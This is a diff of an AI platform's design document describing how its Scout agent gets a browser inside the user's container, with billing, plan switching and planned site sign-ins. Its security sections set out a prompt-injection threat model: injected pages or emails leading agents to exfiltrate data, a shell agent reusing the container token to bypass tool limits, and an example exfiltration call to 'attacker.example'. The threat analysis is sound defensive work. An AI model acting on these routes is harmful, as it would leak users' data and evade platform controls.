+- **The container's own tokens are of little use outside.** `/mcp`, `/git` and LiteLLM are not reachable from the internet (section 4), so a copied Platform MCP token or LiteLLM key works only from inside our networks. The git gateway refuses pushes to the default branch whoever asks.
+- **Internal addresses stay closed.** The open way out is to public websites only; private, loopback, link-local and metadata addresses and the platform's own services stay refused (section 4).
+- **Only containers the platform switched it on for.** Max plan, and only while `BROWSER_AVAILABLE` is on. Free and Pro containers stay locked, and so does every container while the setting is off. Leaving Max closes the way out again on the container's next wake.
+- **On Claude Code the browser is Scout's alone,** by its tool list, and Scout has no files, no shell and no app tools. The agent that reads untrusted pages is not the agent that holds the files.
+- **Browser time costs credits** and shows in usage, and a user at zero credits is not woken at all.
+
+**What does not limit it:**
+
+- **Nothing checks where the container connects.** No allowlist, no seen-address rule, no approval. The platform does not see the browser's traffic, and the activity log shows only calls to the platform's own tools.
+- **The network is open for the whole container, not only for the browser.** The lead and Byte have a shell, and a shell command reaches the same sites. They also read text other people wrote (emails, files, a pull request's code), so an injected instruction there needs no browser at all.
+- **On Hermes the tool limits are instructions** (section 0.7). Any Hermes agent can be told to use the browser.
+- **The Claude sign-in works from anywhere.** Unlike the container's own tokens, a copied Claude credential can be used outside our network until the user signs that session out. The same goes for the secrets of the user's own MCP servers.
+- **Typing into pages.** Whatever Scout types into a form leaves the container.
+- **Sign-ins, when they come** (section 11.6): the browser's cookies would sit in the same container.
+
+**What follows from it:**
+
+- **The trust line on the landing page** says the sandbox reaches only approved services. For a Max user with the browser on that is no longer true. The wording has to change before the browser is offered (`docs/launch-plan.md` section 2).
+- **`BROWSER_AVAILABLE` is the switch for the whole server.** Off, no container is opened, whatever the plan.
+
+**2. `read_page` on Claude Code opens any public address.**
+
+- **What is given up:** the seen-address rule, for turns that run on Claude Code, on every plan. An injected page can tell Scout to fetch an address with data in it.
+- **What Scout has to give:** its task text and what it read on the web. It has no files, no shell and no app tools, and the lead is told to put no secrets or private data into a task.
+- **What still limits it:**
+  - public addresses only, at every redirect, checked again when connecting (section 5.1);
+  - a plain GET with no cookies and no sign-in;
+  - 30 pages a minute per user;
+  - every read is in the activity log (the address without its query string), and a read of an address that had not been seen is marked;
+  - outside a turn that is on record as running on Claude Code, the strict rule applies.
+- **What does not: the platform trusts the agent image for "only Scout".** Every call from a container carries the same container token, so the platform can't tell Scout from the lead or Byte. The tool lists and the hook are enforced by Claude Code inside the container. **An agent with a shell can go around them:** the container's token is in the container's own configuration, and a shell command can call `/mcp` with it and ask for `read_page` itself. So on Claude Code an injected instruction that reaches the lead, Byte or Patch can send data out through `read_page`, one GET at a time, 30 a minute, each in the activity log. On Hermes the strict rule closes this.
+- **What would close it:** a token for Scout's tools that the shell can't read, or the token kept out of the shell's reach. Both are the agent image's side (`vm-manager`). Not built.
+
 ---
 
-## 11. Proposal: Scout's browser (not built; the founder decides)
+## 11. Scout's browser (first version)
 
-**Status:** a proposal written 2026-10-03 for `docs/launch-plan.md` D10, checked and completed 2026-10-04. No browser code exists. Prices were read on the providers' own pages on 2026-10-03 and read again on 2026-10-04; every number in 11.3 was the same on both days (links at the end).
+**Status:** decided 2026-10-04 (`docs/launch-plan.md` D10). This replaces the proposal that stood here before, which recommended a hosted browser (Browserbase) driven by six platform tools: that plan is cancelled, and no hosted provider is used. The platform side is in this repo; the browser itself is in the agent image and the vm-manager (`vm-manager` repo). The old comparison and the providers' prices are in this file's history (`git log -- docs/mvp-hld.md`, before 2026-10-04).
 
-**Decided 2026-10-04** (`docs/launch-plan.md` D10): **the browser allows logins.** The user signs in to a site themselves, inside the browser session; the agent never sees the password. What that needs is in section 11.6. Which option to build, (a) or (b), is still open.
+### 11.1 What was decided
 
-**What is wanted:** on the Max plan, Scout can drive a real browser (open a page, click, type, read what a script-heavy page shows) at **2 credits per minute**. `read_page` covers plain pages already; the browser is for pages that need JavaScript, clicks or forms, and for pages behind a sign-in.
+- **Where:** the browser runs **inside the user's own container.** Not at a hosted provider.
+- **Who:** the **Max plan** only. **Only Scout drives it.**
+- **Price:** **2 credits per minute** of browser time.
+- **What it is for:** pages that `read_page` can't read: pages that need JavaScript, clicks or forms. `read_page` stays the tool for plain pages; it is free and on every plan.
+- **Signing in to sites** is wanted and is **not in this first version** (section 11.6). The first version is for public pages.
 
-### 11.1 The two options
+**What the decision buys and what it costs.**
 
-- **(a) A browser inside each user's container.** Chromium is added to the agent image. Scout drives it there.
-- **(b) A hosted browser service driven by platform tools.** The browser runs at a provider. The api opens a session and Scout drives it through new Platform MCP tools (`browser_open`, `browser_click`, `browser_type`, `browser_read`, `browser_close`), the same way `web_search` and `read_page` work.
+- **Bought:** no supplier and no monthly bill; no third party sees the pages Scout opens; when sign-ins come, the cookies stay on our server and not at a provider.
+- **Paid:** the locked network, for the containers that have the browser on (section 10.3), and server memory, since a browser is heavier than an idle agent (the vm-manager's sizing).
 
-### 11.2 Comparison
+### 11.2 Who does what
 
-| | (a) Browser in the container | (b) Hosted browser + platform tools |
+| Part | Repo | Does |
 |---|---|---|
-| **Memory** | Chromium needs several hundred MB by itself; hosting guides say to give a Chromium container at least 1 GB. Our container limit is 600 MB and an idle container already uses 325 MB. The limit would have to go to about 1.5 GB for Max users | None on our server. The api holds one WebSocket per open session |
-| **Server impact** | The test server has about 5.5 GB for containers: about 15 idle ones today. A browser turn takes the room of 4 of them, so the awake cap must fall or the server must grow. The image grows by several hundred MB, and Chromium under gVisor is slower and needs its own flags | No change to the awake cap or the image |
-| **The locked network** | **Lost for that container.** A browser must reach any site, so the egress proxy would have to allow every domain. Then anything in the container (the user's files, memory, cloned code, a Claude Code sign-in) can be sent anywhere by one injected instruction | **Kept.** The container still reaches only the api, LiteLLM and git. The browser is outside it |
-| **Logged-in sessions** (allowed, decided 2026-10-04; section 11.6) | **Cookies** live in the browser's profile in the user's `/data` volume on our server, and in the nightly backup. **Signing in:** the user needs a way to see and type into the browser in their container. Nothing like that exists; a remote view through the api would have to be built | **Cookies** live at the provider, in one saved profile per user (Browserbase calls it a context: cookies and site storage, encrypted at rest, deleted through its API). A third party holds them. **Signing in:** the provider's live view of the session, shown inside the web app; the user clicks and types in it |
-| **Prompt injection** | The browser sits next to the user's data with an open network. This is the dangerous mix, and the platform can't check where the browser goes | The page can only reach what Scout can: `web_search`, `read_page` and the browser tools. Navigation goes through the platform, so the seen-address rule can be applied to it (section 11.5). The worst case is Scout typing something into a page, and, on a site the user is signed in to, doing things there as the user (section 11.6). On Hermes, Scout's tool limits are only instructions (section 0.7), so the platform's checks are what counts |
-| **Metering browser minutes** | The Bridge reports browser seconds; the vm-manager already stores them per awake period (`browser_seconds` in *GetUsage*) and the usage sync already reads and charges them. Nothing new on the platform | The api opens and closes every session, so it knows the seconds. The usage sync adds them to the browser seconds it already charges: the same 2 credits per minute, the same carry-over of part minutes, the same `browserCredits` in usage. New: a session table, and closing sessions that were left open |
-| **Plan check** | In the vm-manager and the image | In the tool: not on Max → the tool says so |
-| **Work to build** | Image, vm-manager (memory by plan, egress rules, metering), Bridge tools | Platform tools, one provider client, a session table, the sync. One repo |
-| **Risk of the provider** | None | A new supplier and a monthly bill. The provider sees the pages Scout opens |
+| **Agent image** | `vm-manager` | Carries the browser and the tools that drive it. Gives them to Scout only: by tool list on Claude Code, by instruction on Hermes (section 0.7). Reports the seconds the browser was in use |
+| **vm-manager** | `vm-manager` | Keeps `browser_enabled` per container. On a wake, starts the container with or without the browser and with or without the open way out (section 4). Stores browser seconds with each awake period and returns them in *GetUsage* |
+| **Platform** | this repo | Decides who has the browser (plan and setting) and tells the vm-manager. Charges the browser seconds. Tells the apps who has it. Nothing else: the platform does not see what the browser does |
 
-### 11.3 Hosted services: prices and limits
+**The gRPC contract** (`vm-manager/proto/vm/v1/vm.proto`; this repo only reads it):
 
-| Service | Plan | Price | Browser time | Sessions at once | Longest session | Extras |
-|---|---|---|---|---|---|---|
-| **Browserbase** | Free | $0 | 1 hour a month | 3 | 15 minutes | No captcha solving |
-| | Developer | $20 a month | 100 hours included, then $0.12 an hour | 25 | not stated on the page | Proxy: 1 GB included, then $12 per GB |
-| | Startup | $99 a month | 500 hours included, then $0.10 an hour | 100 | not stated on the page | Proxy: 5 GB included, then $10 per GB |
-| **Steel** | Launch | $0 + usage ($30 of credit once) | $0.10 an hour | 10 | 15 minutes | Proxy $10 per GB, captcha $3 per 1,000 |
-| | Scale | $250 a month + usage ($100 of credit a month) | $0.08 an hour | 100 | 1 hour | Proxy $6 per GB, captcha $1 per 1,000 |
-| **Browserless** | Prototyping | $25 a month (billed yearly) | 20,000 units (a unit is up to 30 seconds), then $0.0020 a unit: about $0.24 an hour | 10 (the page shows "+5" next to it) | 15 minutes | Proxy: 6 units per MB (residential), 2 per MB (datacenter) |
-| | Starter | $140 a month (billed yearly) | 180,000 units, then $0.0017 a unit | 40 | 30 minutes | |
+- `CreateSandboxRequest.browser_enabled` (bool): the state a new container starts with.
+- `Sandbox.browser_enabled` (bool): the state the vm-manager has on record. It comes back from *CreateSandbox*, *WakeSandbox*, *GetSandbox* and *SetBrowser*.
+- `SetBrowser(user_id, enabled)` → the sandbox. **It takes effect on the user's next wake.**
+- `UserUsage.browser_seconds` in *GetUsage*: was always 0, now real.
 
-### 11.4 Cost against 2 credits per minute
+**No platform tools for the browser.** The six `browser_*` tools of the cancelled plan do not exist on the Platform MCP. The browser's tools are inside the container.
 
-- **The price:** 2 credits a minute is $0.02 a minute, or **$1.20 an hour**.
-- **Hosted cost:** $0.10 to $0.12 an hour (Steel, Browserbase), about $0.24 on Browserless. That is 0.2 cents a minute. At cost × 2.5 the browser alone would be about half a credit a minute, so 2 credits a minute is about ten times the browser's real cost. The monthly fee is covered early: Browserbase's $20 is 17 browser hours sold.
-- **What the margin is for:** the AI. A browser turn sends many page snapshots to the model. That cost is charged apart (Textcrew AI in credits, or on the user's own key), so it doesn't come out of the 2 credits.
-- **What could break it:** proxies. At $10 to $12 per GB, one heavy session through a proxy can cost more than the minutes earn. **Proposed: no proxies and no captcha solving at launch.**
-- **In-container cost:** only our own RAM. The test server costs about $2.50 a day for 7.6 GB, so 1.5 GB is about $0.02 an hour. It is cheaper per hour, but each browser turn uses the room of four users, and the price is paid in capacity, not dollars.
+### 11.3 The switch: who has the browser
 
-### 11.5 Recommendation
+**The rule.** The browser is on for a user when both hold:
 
-**Option (b): a hosted browser driven by platform tools, starting on Browserbase's Developer plan ($20 a month, 100 hours, then $0.12 an hour).** Steel's Launch plan ($0.10 an hour, no monthly fee, 15-minute sessions) is the fallback; the provider sits behind a small interface like the search provider, so it can be swapped.
+1. **the user's plan includes it:** Max (`limits.browser` in section 7.1);
+2. **the deployment has it:** the setting **`BROWSER_AVAILABLE`** is on. The agent image is deployed apart from the backend, and the backend can't see which image runs, so this setting says so. **It is off by default:** until the image with the browser is deployed, no container is opened and the apps don't promise a browser.
 
-Why:
+Otherwise it is off.
 
-1. **It keeps the locked network.** This is the trust promise on the landing page, and option (a) gives it up for exactly the users who pay most.
-2. **It doesn't touch the server's memory.** Option (a) needs a bigger container and a lower awake cap before launch.
-3. **It fits how Scout already works:** Scout has only platform tools, and the platform checks the plan, meters the minutes and writes the activity log in one place.
-4. **It is the smaller build,** in one repo.
+**When the platform sends it.** It always sends the wanted state (on or off), never "flip it", so every one of these can be repeated safely:
 
-Proposed limits for the first version: Max plan only; one browser session per user; closed after 2 idle minutes and after 15 minutes at most; logins allowed, with the user signing in themselves (section 11.6; this replaces the earlier proposal of public pages only); no proxies and no captcha solving; the same address rules as `read_page` for every page the browser is sent to; refused at zero credits; metered per second and charged at 2 credits per minute through the usage sync.
+| When | How |
+|---|---|
+| **A container is created** (sign-up) | `browser_enabled` in *CreateSandbox* |
+| **The plan changes:** upgrade to Max, downgrade from Max, a cancelled subscription reaching its end | Billing reports the change; a **`sync-browser`** job on the *system* queue reads the plan again and calls *SetBrowser*. It retries like any job (section 0.2). No container yet: nothing to do, the container will be created with the right state |
+| **After every wake** | The woken sandbox says what it has on record. If that differs from the rule, *SetBrowser* is sent again. This catches a job that ran out of tries, a container made before the browser existed, and the setting being switched on or off |
 
-**Navigation needs the seen-address rule too** (added 2026-10-04). A browser that opens any address the agent types is the same way out as an unchecked `read_page`: `browser_open("https://attacker.example/?d=<private data>")`. So `browser_open` must take only an address already seen for this user (section 5.1), and links the browser shows count as seen, like links on a read page. Two things are harder than with `read_page` and need their own answer before the browser is built: **typing** (`browser_type` puts agent-chosen text into a page, which is a way out by itself; the first version could allow typing only into a search box on a seen page, or ask for approval), and **requests the page makes by itself** (scripts, images and redirects, which a hosted browser fetches without asking us). With option (a) the platform can't apply the rule at all: the browser sits in the container and the open network is the way out.
+- **A change takes effect on the next wake.** A user who upgrades while their container is awake gets the browser after the container has stopped and woken again (it stops after 3 quiet minutes). A user who leaves Max while awake keeps it until then; those minutes are charged.
+- **A plan changes only from Polar's webhooks or when a cancelled period ends** (section 7.6), so that is where the job is added. The dev script (`scripts/dev-user.ts create`) sets a plan directly and sends the switch itself.
+- **Only Max containers are ever opened.** The setting alone opens nothing.
 
-**What the founder decides:** option (a) or (b); if (b), which provider and who opens the account; how far Scout may type into pages (the way out that the seen-address rule doesn't cover); and the open points about logins in section 11.6. Decided already: logins are allowed, and the user signs in themselves (2026-10-04).
+### 11.4 Money
 
-**Not checked:** how Browserbase and Steel bill a session that is opened and left idle, the longest session on Browserbase's paid plans, and whether Chromium runs acceptably under gVisor in our image (only needed for option (a)). For logins: the live view and the saved profile were read in the providers' docs on 2026-10-04 and not tried on a real account; whether Steel keeps cookies between sessions was not found.
+- **2 credits per minute of browser time: 1 credit per 30 seconds.** The vm-manager counts the seconds the browser was in use and returns them in *GetUsage*; the usage sync turns them into credits (section 7.4). Nothing new was needed on the platform: the sync already read and charged `browser_seconds`, which was always 0.
+- **Part minutes carry over** between syncs, the way awake time does: 20 seconds in one sync and 10 in the next is 1 credit. Nothing is rounded up.
+- **Charged once.** Browser time is part of the one charge per user per usage period, which has a unique key (user, period start). A sync that runs twice, or the 5-minute job and the after-turn sync running together, can't charge it twice.
+- **Awake time is charged as well.** The container is awake while the browser runs: 1 credit per 10 minutes on top. A browser minute costs 2.1 credits in all.
+- **The AI is charged apart.** A browser turn sends many page snapshots to the model. That is Textcrew AI in credits, or the user's own key or Claude plan (section 7.1).
+- **In usage:** each period carries `browserSeconds` and `browserCredits`, and the totals carry `browserCredits` (`GET /v1/usage`). The credit history line reads `Usage: …, browser N`.
+- **At zero credits the container is not woken** (section 7.5), so no browser runs. **Inside a turn the browser is not cut off** when the credits run out: a turn lasts 15 minutes at most, so the overrun is at most 30 credits of browser time, recovered from the next grant.
+- **A turn reversed as our fault** gives its browser credits back with the rest of the turn (section 7.2).
+- **Whoever's browser seconds arrive are charged.** The plan is checked when the browser is switched on, not when it is charged: a user who left Max and used the browser until their container stopped pays for those minutes.
 
-**Sources** (read 2026-10-03 and again 2026-10-04): [Browserbase pricing](https://www.browserbase.com/pricing) · [Browserbase contexts](https://docs.browserbase.com/features/contexts) · [Browserbase live view](https://docs.browserbase.com/features/session-live-view) · [Steel pricing and limits](https://docs.steel.dev/overview/pricinglimits) · [Steel: a person in the session](https://docs.steel.dev/overview/sessions-api/human-in-the-loop) · [Browserless pricing](https://www.browserless.io/pricing) · [Railway's Playwright guide](https://docs.railway.com/guides/playwright) (1 GB for a Chromium container) · our measured container memory: `vm-manager/README.md`.
+### 11.5 What the apps are told
 
-### 11.6 Logins: the user signs in themselves (decided 2026-10-04)
+- **`GET /v1/plans`:** Max has `limits.browser: true` and the feature line "Browser use: 2 credits per minute". Free and Pro have neither.
+- **`GET /v1/crew`,** Scout's `browser`:
+  - `requiresPlan`: `max`;
+  - `available`: this deployment has the browser (`BROWSER_AVAILABLE`);
+  - `enabled`: it is on for this user (`available`, and the user's plan includes it). This is the state the platform sends to the vm-manager.
+- **Scout's description** says the real browser needs the Max plan.
+- **`GET /v1/usage`:** `browserSeconds` and `browserCredits` (section 11.4).
+- **No screen shows the browser itself.** That comes with signing in (section 11.6).
 
-**The decision** (`docs/launch-plan.md` D10): the browser may be used on sites that need a sign-in. **The user signs in themselves. The agent never sees the password.** This replaces the earlier proposal of public pages only. Nothing is built.
+### 11.6 The next step: signing in to sites (not built)
+
+**Decided 2026-10-04** (`docs/launch-plan.md` D10): the browser may be used on sites that need a sign-in. **The user signs in themselves; the agent never sees the password.** It is not in the first version because it needs a way for the user to see the browser, and none exists.
 
 **How a sign-in would go:**
 
-1. Scout reaches a sign-in page and stops. It tells the user, through the lead, that the site needs them to sign in.
-2. The user opens the browser session in the **web app** and signs in there: user name, password, a code from their phone. They type into the real page, not into the chat. The session waits for them, so the 2-minute idle limit has to be longer while it waits.
+1. Scout reaches a sign-in page and stops. Through the lead, it tells the user that the site needs them to sign in.
+2. The user opens the browser session in the **web app** and signs in there: user name, password, a code from their phone. They type into the real page, not into the chat.
 3. The user says they are done (a button), and Scout goes on, now signed in.
 
-**What that requires:**
+**What it needs:**
 
-- **A way for the user to see and type into the browser session.**
-  - **Option (b), hosted:** the provider's live view. Browserbase's docs describe a live view link that goes in an iframe, where a person can click and type; Steel's describe a session viewer with an `interactive` setting. The api would hand the web app a link for the user's own session only.
-  - **Option (a), in the container:** nothing exists. A remote view of the container's browser, passed through the api, would have to be built. This adds to the work of option (a).
-  - **Telegram** can't show a browser. The chat gets a line that names the web app; the sign-in happens there.
-- **The agent must not see the password.** The browser tools give Scout what a page shows and let it type. So, while the user is signing in:
-  - **the browser tools are paused** for that session: no reading, no typing, no clicking by the agent, until the user says they are done;
-  - **`browser_type` never types into a password field,** at any time, and the agent is never asked to hold a password. A user who sends a password in chat is told to sign in in the web app instead;
-  - what the agent reads from a page **leaves out the values of password fields**.
-- **Somewhere for the sign-in to live** (the session cookies), so the user doesn't sign in again on every turn:
-
-  | | (a) Browser in the container | (b) Hosted browser |
-  |---|---|---|
-  | **Where the cookies live** | In the browser's profile in the user's `/data` volume, on our server | At the provider, in one saved profile per user (a Browserbase context). The platform keeps only the profile's id |
-  | **Who else holds them** | Nobody. They are in our nightly backup, which goes off the server | The provider. Browserbase says contexts are encrypted at rest |
-  | **Who can reach them** | Anything running in the container: the cookies sit next to the agent, its shell and, with option (a), an open network. One injected instruction could send them out | Only the browser. The agent's tools return page text, never cookies; the container never holds them |
-  | **Removing them** | Delete the profile folder; the copies in old backups stay until those are deleted | The provider's delete call, when the user asks and when the account is deleted |
-
-  With logins allowed, this table is a second reason for option (b): in option (a) the user's sign-ins would sit inside the container whose network had to be opened.
+- **A way for the user to see and type into the browser in their container.** A live view of the container's browser, passed from the vm-manager through the api to the web app, for the user's own session only. Nothing like it exists; it is the main piece of work. Telegram can't show a browser: the chat gets a line that names the web app.
+- **The agent kept out while the user types.** The browser's tools are paused for that session until the user says they are done. The agent never types into a password field, and what it reads from a page leaves out the values of password fields. A user who sends a password in chat is told to sign in in the web app instead.
+- **Somewhere for the sign-in to live.** The cookies would be in the browser's profile in the user's `/data` volume: on our server, in the nightly backup, and within reach of anything running in the container (section 10.3). That last point is the cost of having the browser in the container.
 - **A screen for the user:** which sites the browser is signed in to, and a way to sign out of one or of all. Deleting the account removes them.
+- **A rule for a signed-in site.** There, Scout acts as the user: it can post, buy, delete or change settings by clicking. It needs its own limit before it is built, for example: Scout reads freely, and a click that submits a form asks the user first, like a risky app action (section 5.1).
 
-**What a signed-in browser changes.** On a public page the worst a hostile page can do is make Scout type something. On a site the user is signed in to, Scout acts **as the user**: it can post, buy, delete or change settings by clicking. Scout has no app actions for exactly this reason (section 0.7), and a signed-in browser gives some of that back. Before it is built it needs its own rule, for example: on a signed-in site Scout reads freely, and a click that submits a form asks the user first, like a risky app action (section 5.1).
-
-**For the founder to decide** (all still open):
+**For the founder to decide** (all open):
 
 - **How long a sign-in is kept:** until the user signs out, or for a fixed time (for example 30 days).
 - **Which sites:** any site, or not some kinds (banks, the user's email, password managers).
 - **What Scout may do on a signed-in site** without asking: read only, or also click and submit.
-- **The minutes the user spends signing in:** charged at 2 credits per minute like the rest of the session, or free.
+- **The minutes the user spends signing in:** charged at 2 credits per minute like the rest, or free.
+
+### 11.7 Limits of the first version, and what is not checked
+
+- **Public pages only;** no sign-ins (section 11.6).
+- **No address rule for the browser.** The platform can't apply the seen-address rule to a browser inside the container (section 10.3).
+- **No view of the browser for the user,** and no list of the pages it opened: the activity log shows the platform's own tools, and the browser is not one of them. Crew progress lines (`Scout: …`) are what the user sees.
+- **A change of plan reaches the browser on the next wake,** not at once (section 11.3).
+- **Not checked from this repo:** how the browser runs under gVisor, how much memory it needs and what that does to the awake cap, how browser seconds are counted, and that the open way out refuses internal addresses. These are the vm-manager's and the image's side.
 
 > Hosting, server setup and sizing live in a separate doc, `docs/deployment.md`. They are not needed to write the code.
